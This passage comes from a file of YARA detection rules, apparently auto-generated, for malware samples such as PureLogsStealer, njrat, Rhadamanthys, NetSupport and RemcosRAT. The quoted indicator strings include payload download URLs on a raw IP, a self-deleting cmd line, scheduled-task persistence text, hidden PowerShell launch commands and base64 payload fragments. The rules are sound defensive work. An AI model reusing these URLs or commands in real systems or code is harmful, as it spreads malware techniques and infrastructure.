      hash1 = "339d2c7c00043ef1ffa01080771fc2392d4b693dd822370511201f5bf0f45f28"
   strings:
      $s1 = "HlKZ.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s3 = "HlKZ.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s5 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s6 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s7 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s8 = "csvContent" fullword ascii /* score: '9.00'*/
      $s9 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
      $s10 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s11 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule PureCrypter_signature_ {
   meta:
      description = "_subset_batch - file PureCrypter(signature).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d4a81f9d2933a73c03f1cd366c95181e55a84e9f73d407df795fae89b808c1a2"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Backup\\AdidasLauncher\\obj\\Release\\net10.0-windows8.0\\win-x64\\TruckPDF_Viewer.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "System.Resources.Extensions.DeserializingResourceReader, System.Resources.Extensions, Version=4.0.0.0, Culture=neutral, PublicKe" ascii /* score: '27.00'*/
      $s3 = "System.Resources.Extensions.RuntimeResourceSet, System.Resources.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=cc" ascii /* score: '27.00'*/
      $s4 = "System.Resources.Extensions.RuntimeResourceSet, System.Resources.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=cc" ascii /* score: '27.00'*/
      $s5 = " https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation.-->" fullword ascii /* score: '22.00'*/
      $s6 = "System.Resources.Extensions.DeserializingResourceReader, System.Resources.Extensions, Version=4.0.0.0, Culture=neutral, PublicKe" ascii /* score: '21.00'*/
      $s7 = "https://bucket-aws-s1.com" fullword wide /* score: '21.00'*/
      $s8 = "TruckPDF_Viewer.dll" fullword wide /* score: '20.00'*/
      $s9 = "System.Net.WebClient" fullword ascii /* score: '17.00'*/
      $s10 = "System.ComponentModel.Primitives" fullword ascii /* score: '17.00'*/
      $s11 = "System.ComponentModel.TypeConverter" fullword ascii /* score: '17.00'*/
      $s12 = "System.Drawing.Common" fullword ascii /* score: '17.00'*/
      $s13 = "https://deep-seekv2.com/app?name=" fullword wide /* score: '17.00'*/
      $s14 = "https://bucket-aws-s1.com/Order.pdf" fullword wide /* score: '17.00'*/
      $s15 = " requestedExecutionLevel " fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4a9ea800 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4a9ea800.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4a9ea80070aeef34e75107e504544232228ffa9a09e037c778cd264a2c5564d2"
   strings:
      $x1 = "DownloaderApp.exe" fullword wide /* score: '37.00'*/
      $x2 = "C:\\10\\boot\\Downloader_win\\DownloaderApp\\DownloaderApp\\obj\\Release\\DownloaderApp.pdb" fullword ascii /* score: '37.00'*/
      $s3 = "svchosthelper.exe" fullword wide /* score: '27.00'*/
      $s4 = "systemhelper.exe" fullword wide /* score: '25.00'*/
      $s5 = "DownloaderService" fullword wide /* score: '22.00'*/
      $s6 = "DownloaderApp" fullword wide /* score: '19.00'*/
      $s7 = "<Task version=\"1.4\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" fullword wide /* score: '17.00'*/
      $s8 = "\" start= auto DisplayName= \"Windows Download Service\"" fullword wide /* score: '13.00'*/
      $s9 = "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" fullword wide /* score: '11.00'*/
      $s10 = "/c schtasks /create /tn \"" fullword wide /* score: '11.00'*/
      $s11 = ".NET Framework 4.7.2" fullword ascii /* score: '10.00'*/
      $s12 = ".NETFramework,Version=v4.7.2" fullword ascii /* score: '10.00'*/
      $s13 = "* wq>Et" fullword ascii /* score: '9.00'*/
      $s14 = "WindowsLogsHelper" fullword wide /* score: '9.00'*/
      $s15 = "  <Actions Context=\"Author\">" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule PureHVNC_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__5a6e2ff5 {
   meta:
      description = "_subset_batch - file PureHVNC(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_5a6e2ff5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5a6e2ff545b02e2632997900d5b20d386cdb04a4ef2061d307bfc6ce59b0e7e0"
   strings:
      $s1 = "YIGELappsVUT_l869137542025B.exe" fullword wide /* score: '19.00'*/
      $s2 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '17.00'*/
      $s3 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s4 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '12.00'*/
      $s5 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s6 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s7 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s8 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s9 = "Bu`w9H" fullword ascii /* reversed goodware string 'H9w`uB' */ /* score: '11.00'*/
      $s10 = "c:\\!x9" fullword ascii /* score: '10.00'*/
      $s11 = "sVBWLGET" fullword ascii /* score: '9.00'*/
      $s12 = "* I\"2w:RrK2l" fullword ascii /* score: '9.00'*/
      $s13 = "* \" I}-" fullword ascii /* score: '9.00'*/
      $s14 = "mqavkcoa" fullword ascii /* score: '8.00'*/
      $s15 = "proggam" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30000KB and
      8 of them
}

rule PureHVNC_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__969d1feb {
   meta:
      description = "_subset_batch - file PureHVNC(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_969d1feb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "969d1feb4b5862696a9846f23891e9d58e98c5ec68122675f282bbadf7503016"
   strings:
      $s1 = "IMOLTsoftDVS_ILd504676EGSX.exe" fullword wide /* score: '19.00'*/
      $s2 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '17.00'*/
      $s3 = "/dumpstra" fullword ascii /* score: '14.00'*/
      $s4 = "O /logs9ta:u" fullword ascii /* score: '13.00'*/
      $s5 = "* -,so" fullword ascii /* score: '13.00'*/
      $s6 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s7 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '12.00'*/
      $s8 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s9 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s10 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s11 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s12 = "* 8E-Xn" fullword ascii /* score: '9.00'*/
      $s13 = "* WdX$" fullword ascii /* score: '9.00'*/
      $s14 = "i1SpYoa*,B" fullword ascii /* score: '9.00'*/
      $s15 = "$>`\\5>\"6" fullword ascii /* score: '9.00'*/ /* hex encoded string 'V' */
   condition:
      uint16(0) == 0x5a4d and filesize < 29000KB and
      8 of them
}

rule njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0a29b66b {
   meta:
      description = "_subset_batch - file njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0a29b66b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0a29b66b906fc203c48bf3b88b00f95196435426312aee0032a7be4b928bd9ce"
   strings:
      $x1 = "cmd.exe /c ping 0 -n 2 & del \"" fullword wide /* score: '42.00'*/
      $s2 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s3 = "Dllhost.exe" fullword wide /* score: '27.00'*/
      $s4 = "Execute ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s5 = "Stub.exe" fullword ascii /* score: '22.00'*/
      $s6 = "Execute ERROR " fullword wide /* score: '21.00'*/
      $s7 = "/Server.exe" fullword wide /* score: '19.00'*/
      $s8 = "Download ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s9 = "Executed As " fullword wide /* score: '18.00'*/
      $s10 = "winmgmts:\\\\.\\root\\SecurityCenter2" fullword wide /* score: '18.00'*/
      $s11 = "processInformationLength" fullword ascii /* score: '15.00'*/
      $s12 = "getvalue" fullword wide /* score: '13.00'*/
      $s13 = "set cdaudio door closed" fullword wide /* score: '13.00'*/
      $s14 = "Update ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s15 = "shutdown -r -t 00" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__87549c24 {
   meta:
      description = "_subset_batch - file njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_87549c24.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "87549c24e84c8785631eca43bffb0338f240324c2f05e1b20cbb9e6329a1b42b"
   strings:
      $s1 = "Stub.exe" fullword ascii /* score: '22.00'*/
      $s2 = "get_ccee65264e741b7dfc3165c3585848b99" fullword ascii /* score: '9.00'*/
      $s3 = "get_cf6e82ed0c1daba9c8bf7f3521de59895" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule NetSupport_signature_ {
   meta:
      description = "_subset_batch - file NetSupport(signature).cab"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f7d648de1b39d58a91f42e34a5983eedc55f23fc48503d11abb8f752c4e4127f"
   strings:
      $s1 = "remcmdstub.exe" fullword ascii /* score: '25.00'*/
      $s2 = "PCICL32.DLL" fullword ascii /* score: '23.00'*/
      $s3 = "PCICHEK.DLL" fullword ascii /* score: '23.00'*/
      $s4 = "htctl32.dll" fullword ascii /* score: '23.00'*/
      $s5 = "TCCTL32.DLL" fullword ascii /* score: '23.00'*/
      $s6 = "pcicapi.dll" fullword ascii /* score: '19.00'*/
      $s7 = "nskbfltr.inf" fullword ascii /* score: '10.00'*/
      $s8 = "6=@62$\\2" fullword ascii /* score: '9.00'*/ /* hex encoded string 'f"' */
      $s9 = "!zbEyE?" fullword ascii /* score: '9.00'*/
      $s10 = "fbbfbabebg" fullword ascii /* score: '8.00'*/
      $s11 = "8%D%v\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x534d and filesize < 7000KB and
      8 of them
}

rule NetSupport_signature__44b9e976 {
   meta:
      description = "_subset_batch - file NetSupport(signature)_44b9e976.cab"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "44b9e97673ec22334340689eaa01c4e47146ca00e9af25c319a65e879032acf0"
   strings:
      $s1 = "remcmdstub.exe" fullword ascii /* score: '25.00'*/
      $s2 = "PCICL32.DLL" fullword ascii /* score: '23.00'*/
      $s3 = "PCICHEK.DLL" fullword ascii /* score: '23.00'*/
      $s4 = "htctl32.dll" fullword ascii /* score: '23.00'*/
      $s5 = "TCCTL32.DLL" fullword ascii /* score: '23.00'*/
      $s6 = "pcicapi.dll" fullword ascii /* score: '19.00'*/
      $s7 = "iiiyyy" fullword ascii /* reversed goodware string 'yyyiii' */ /* score: '15.00'*/
      $s8 = "nskbfltr.inf" fullword ascii /* score: '10.00'*/
      $s9 = "!zbEyE?" fullword ascii /* score: '9.00'*/
      $s10 = "@,#=-55--" fullword ascii /* score: '9.00'*/ /* hex encoded string 'U' */
      $s11 = "lmmmiiijn" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x534d and filesize < 7000KB and
      8 of them
}

rule NetSupport_signature__509a5526 {
   meta:
      description = "_subset_batch - file NetSupport(signature)_509a5526.cab"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "509a55261d280eefb1b3e2e2300c76ca7b9e95b7ce2e38c01d5161da9e92586f"
   strings:
      $s1 = "remcmdstub.exe" fullword ascii /* score: '25.00'*/
      $s2 = "PCICL32.DLL" fullword ascii /* score: '23.00'*/
      $s3 = "PCICHEK.DLL" fullword ascii /* score: '23.00'*/
      $s4 = "htctl32.dll" fullword ascii /* score: '23.00'*/
      $s5 = "TCCTL32.DLL" fullword ascii /* score: '23.00'*/
      $s6 = "pcicapi.dll" fullword ascii /* score: '19.00'*/
      $s7 = "nskbfltr.inf" fullword ascii /* score: '10.00'*/
      $s8 = "oiRCU6'" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x534d and filesize < 7000KB and
      all of them
}

rule Rhadamanthys_signature__9ae08c606d843efb92930f7f2907ad40_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_9ae08c606d843efb92930f7f2907ad40(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f7f566159312a1d9857484739cd602c8dd5a03533fcd0cd4136c195abd6ba94d"
   strings:
      $s1 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s3 = "(SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s4 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s5 = "(registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s6 = "%s\\Contact_Explain.txt" fullword wide /* score: '11.00'*/
      $s7 = "%s\\Contact_Explain Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s8 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s9 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
      $s10 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule Rhadamanthys_signature__9ae08c606d843efb92930f7f2907ad40_imphash__3b7e191d {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_9ae08c606d843efb92930f7f2907ad40(imphash)_3b7e191d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3b7e191d41099251482a950178cca57c47faaa03c28c9643a58afe3a87d171d9"
   strings:
      $s1 = "(SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s2 = "(registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s3 = "%s\\Contact_Explain.txt" fullword wide /* score: '11.00'*/
      $s4 = "%s\\Contact_Explain Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s5 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule Rhadamanthys_signature__23aa6ede111f6ac860a5e9008f9b9673_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_23aa6ede111f6ac860a5e9008f9b9673(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7eeef30cc2de72ec2d408bbc2d1ce7a5b58be89908f5e44667f89332fd2f7d49"
   strings:
      $s1 = "http://176.46.152.62:5858/291594921b82442f8c10853291a896ac_bound_build.exe" fullword ascii /* score: '27.00'*/
      $s2 = "nbgtpasrg.exe" fullword ascii /* score: '22.00'*/
      $s3 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s4 = ".?AVfilesystem_error@filesystem@std@@" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule Rhadamanthys_signature__23aa6ede111f6ac860a5e9008f9b9673_imphash__2af8a3d7 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_23aa6ede111f6ac860a5e9008f9b9673(imphash)_2af8a3d7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2af8a3d77c5c9d595fa21dd8f516f4f8fa9cf5cb61ad05dd9a3e2fc89148534f"
   strings:
      $s1 = "http://176.46.152.62:5858/miport.exe" fullword ascii /* score: '30.00'*/
      $s2 = "http://176.46.152.62:5858/51899d5a125541bfa04eb789dc73f319_crypted_build.exe" fullword ascii /* score: '27.00'*/
      $s3 = "nbgtpasrg.exe" fullword ascii /* score: '22.00'*/
      $s4 = "sece.exe" fullword ascii /* score: '22.00'*/
      $s5 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s6 = ".?AVfilesystem_error@filesystem@std@@" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule Rhadamanthys_signature__23aa6ede111f6ac860a5e9008f9b9673_imphash__589c456a {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_23aa6ede111f6ac860a5e9008f9b9673(imphash)_589c456a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "589c456a1bd31d8bf2d1a791aeffdf587b5c7ed24cd3c3abd40c534ec4b9f37d"
   strings:
      $s1 = "http://176.46.152.62:5858/miport.exe" fullword ascii /* score: '30.00'*/
      $s2 = "http://176.46.152.62:5858/21cb0f113ed0434e9951223abd0d7119_crypted_build.exe" fullword ascii /* score: '27.00'*/
      $s3 = "nbgtpasrg.exe" fullword ascii /* score: '22.00'*/
      $s4 = "secondfile.exe" fullword ascii /* score: '22.00'*/
      $s5 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s6 = ".?AVfilesystem_error@filesystem@std@@" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule Rhadamanthys_signature__23aa6ede111f6ac860a5e9008f9b9673_imphash__949d3a26 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_23aa6ede111f6ac860a5e9008f9b9673(imphash)_949d3a26.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "949d3a2623ef4fabb2416afe75072a3d0b5cef4ddb4ea6f797845701e3379540"
   strings:
      $s1 = "http://176.46.152.62:5858/miport.exe" fullword ascii /* score: '30.00'*/
      $s2 = "http://176.46.152.62:5858/493d0dfa7e0a46fe89bdfab48f9ce98f_crypted_build.exe" fullword ascii /* score: '27.00'*/
      $s3 = "nbgtpasrg.exe" fullword ascii /* score: '22.00'*/
      $s4 = "secondfile.exe" fullword ascii /* score: '22.00'*/
      $s5 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s6 = ".?AVfilesystem_error@filesystem@std@@" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule Quakbot_signature_ {
   meta:
      description = "_subset_batch - file Quakbot(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "63725dfbc8a828c6a61c132b943da54ea746fde801d095185a02ef6d4f07473c"
   strings:
      $x1 = "C:\\Windows\\System32\\wscript.exe" fullword ascii /* score: '32.00'*/
      $s2 = "(..\\..\\..\\..\\Windows\\System32\\wscript.exe1C:\\Program Files (x86)\\Microsoft\\Edge\\ApplicationV\"\\\\pottery-determinatio" wide /* score: '26.00'*/
      $s3 = "}System32" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 3KB and
      1 of ($x*) and all of them
}

rule PureLogsStealer_signature_ {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d86c1f589136c80aaf1162651481efd79e01f3fe6ce1108faf90a8787f63d39a"
   strings:
      $x1 = "                                                                                                                                " wide /* score: '55.00'*/
      $x2 = "%SystemRoot%\\System32\\shell32.dll" fullword wide /* score: '34.00'*/
      $x3 = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword ascii /* score: '31.00'*/
      $s4 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s5 = "Jpowershell.exe" fullword wide /* score: '27.00'*/
      $s6 = "Generated: 2025-09-16 07:31:39?..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s7 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 10KB and
      1 of ($x*) and all of them
}

rule PureLogsStealer_signature__33bc65e4 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_33bc65e4.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "33bc65e4f8bc25a0289128c3ee2b25f9811a50589d5de93e3c65a89401d20270"
   strings:
      $x1 = "                                                                                                                                " wide /* score: '55.00'*/
      $x2 = "%SystemRoot%\\System32\\shell32.dll" fullword wide /* score: '34.00'*/
      $x3 = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword ascii /* score: '31.00'*/
      $s4 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s5 = "Jpowershell.exe" fullword wide /* score: '27.00'*/
      $s6 = "Generated: 2025-09-16 21:33:59?..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s7 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 10KB and
      1 of ($x*) and all of them
}

rule PureLogsStealer_signature__2 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "984d56e3cb24742ac8f5699c59611a68f8c6dfba55c77c412e2ae4d1156ae224"
   strings:
      $s1 = "Mizqud.exe" fullword wide /* score: '22.00'*/
      $s2 = "{e63100be-81ce-4f7a-89f1-615219e45371}, PublicKeyToken=3e56350693f7355e" fullword wide /* score: '13.00'*/
      $s3 = "Selected compression algorithm is not supported." fullword wide /* score: '10.00'*/
      $s4 = "Unknown Header" fullword wide /* score: '9.00'*/
      $s5 = "SmartAssembly.Attributes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule NetSupport_signature__416745ed {
   meta:
      description = "_subset_batch - file NetSupport(signature)_416745ed.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "416745ed78fbf2af4b1ef1d38aa9c8b5697a2007b417117ed5b4e1229ecd4283"
   strings:
      $s1 = "client32.ini}RM" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 60KB and
      all of them
}

rule RemcosRAT_signature__2 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "baba40326630b49d1d996b61d2ed9cbc8f87efadb8848fadbd1264a8de7d92ed"
   strings:
      $x1 = "    startupCmd = \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"\"\" & startupPsFile & \"\"\"\"" fullword ascii /* score: '38.00'*/
      $x2 = "    psCmd = \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"\"\" & psFile & \"\"\"\"" fullword ascii /* score: '38.00'*/
      $s3 = "base64Content = \"ZnVuY3Rpb24gSW52b2tlLUFzc2VtYmx5TWV0aG9kIHsNCiAgICBwYXJhbSgNCiAgICAgICAgW0J5dGVbXV0kQXNzZW1ibHlCeXRlcywNCiAgIC" ascii /* score: '28.00'*/
      $s4 = "    Set processes = wmi.ExecQuery(\"SELECT * FROM Win32_Process WHERE Name = '\" & processName & \"'\")" fullword ascii /* score: '27.00'*/
      $s5 = "XZGhkR1ZHYjNKR2RXNWpkR2x2YmxCdmFXNTBaWElBUkdWc1pXZGhkR1VBVTBoUFQxUUFjR0YwYUFCQ2VYUmxBSEJoZVd4dllXUUFTVzUwTVRZQVUybDZaVTltQUVWdGN" ascii /* base64 encoded string 'dhdGVGb3JGdW5jdGlvblBvaW50ZXIARGVsZWdhdGUAU0hPT1QAcGF0aABCeXRlAHBheWxvYWQASW50MTYAU2l6ZU9mAEVtc' */ /* score: '26.00'*/
      $s6 = "Bb0VBd0FBQUIxVGVYTjBaVzB1UjJ4dlltRnNhWHBoZEdsdmJpNVVaWGgwU1c1bWJ3Y0FBQUFQYlY5c2FYTjBVMlZ3WVhKaGRHOXlERzFmYVhOU1pXRmtUMjVzZVExdFg" ascii /* base64 encoded string 'oEAwAAAB1TeXN0ZW0uR2xvYmFsaXphdGlvbi5UZXh0SW5mbwcAAAAPbV9saXN0U2VwYXJhdG9yDG1faXNSZWFkT25seQ1tX' */ /* score: '26.00'*/
      $s7 = "BQUFBQUlBQUFCV0FBQUFBQUFBQUFBQUFBQUFBQUJBQUFEQUxuSnpjbU1BQUFCMEF3QUFBS0FBQUFBRUFBQUFXQUFBQUFBQUFBQUFBQUFBQUFBQVFBQUFRQzV5Wld4dll" ascii /* base64 encoded string 'AAAAIAAABWAAAAAAAAAAAAAAAAAABAAADALnJzcmMAAAB0AwAAAKAAAAAEAAAAWAAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvY' */ /* score: '26.00'*/
      $s8 = "DUWtiV1YwYUc5a01IZzJNREF3TURBM0xURUFKQ1J0WlhSb2IyUXdlRFl3TURBd01qQXRNUUFrSkcxbGRHaHZaREI0TmpBd01EQXlNQzB5QUNRa2JXVjBhRzlrTUhnMk1" ascii /* base64 encoded string 'QkbWV0aG9kMHg2MDAwMDA3LTEAJCRtZXRob2QweDYwMDAwMjAtMQAkJG1ldGhvZDB4NjAwMDAyMC0yACQkbWV0aG9kMHg2M' */ /* score: '24.00'*/
      $s9 = "YTmpjbWx3ZEdsdmJrRjBkSEpwWW5WMFpRQkJjM05sYldKc2VVTnZibVpwWjNWeVlYUnBiMjVCZEhSeWFXSjFkR1VBUVhOelpXMWliSGxEYjIxd1lXNTVRWFIwY21saWR" ascii /* base64 encoded string 'NjcmlwdGlvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlid' */ /* score: '24.00'*/
      $s10 = "3RUlCQW9CRWpBRUNnRVNOQVFLQVJJVUJBb0JFaEFFQ2dFU0hBUUtBUklnQkFvQkVoZ0VDZ0VTSkFRS0FSSW9CQW9CRWl3RUFBRUpDQVVBQWdnY0NBTUFBQWdHQUFNQ0h" ascii /* base64 encoded string 'EIBAoBEjAECgESNAQKARIUBAoBEhAECgESHAQKARIgBAoBEhgECgESJAQKARIoBAoBEiwEAAEJCAUAAggcCAMAAAgGAAMCH' */ /* score: '24.00'*/
      $s11 = " with your actual Base64 encoded PowerShell script" fullword ascii /* score: '24.00'*/
      $s12 = "WTnBlbVU5TmpRQVgxOVRkR0YwYVdOQmNuSmhlVWx1YVhSVWVYQmxVMmw2WlQweE9BQkxWMWszYkRJM1VHNEFibFJtVGxGUGFYbDNBR1IyUVVFelRESjRWd0JwZG10a1U" ascii /* base64 encoded string 'NpemU9NjQAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT0xOABLV1k3bDI3UG4AblRmTlFPaXl3AGR2QUEzTDJ4VwBpdmtkU' */ /* score: '24.00'*/
